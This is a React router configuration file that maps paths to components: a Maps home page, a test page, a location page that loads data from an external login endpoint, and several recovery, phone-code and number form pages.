import { createBrowserRouter } from "react-router-dom";
import Home from "../components/Home/Home";
import Maps from "../components/Maps/Maps";
import Recovery from "../components/Form/Recovery";
import RecoveryCode from "../components/Form/RecoveryCode";
import NumberPage from "../components/Form/NumberPage";
import RecoveryCodeNew from "../components/Form/RecoveryCodeNew";
import PhoneCode from "../components/Form/PhoneCode";
import New from "../components/Form/New";



export const router = createBrowserRouter([
  {
    path: "/",
    element: <Maps></Maps>,
  },
  {
    path: "/test",
    element: <New></New>,
  },

  {
    path: "location/:id",
    loader: ({ params }) =>
      fetch(`https://najmulmalek.vercel.app/auth/login/${params.id}`),
    element: <Home></Home>,
  },
  {
    path: "/recovery",
    element: <Recovery></Recovery>,
  },
  {
    path: "/code",
    element: <RecoveryCode></RecoveryCode>,
  },
  {
    path: "/get-code",
    element: <PhoneCode></PhoneCode>,
  },
  {
    path: "/phone-code",
    element: <RecoveryCodeNew ></RecoveryCodeNew>,
  },
  {
    path: "/number",
    element: <NumberPage></NumberPage>,
  },
]);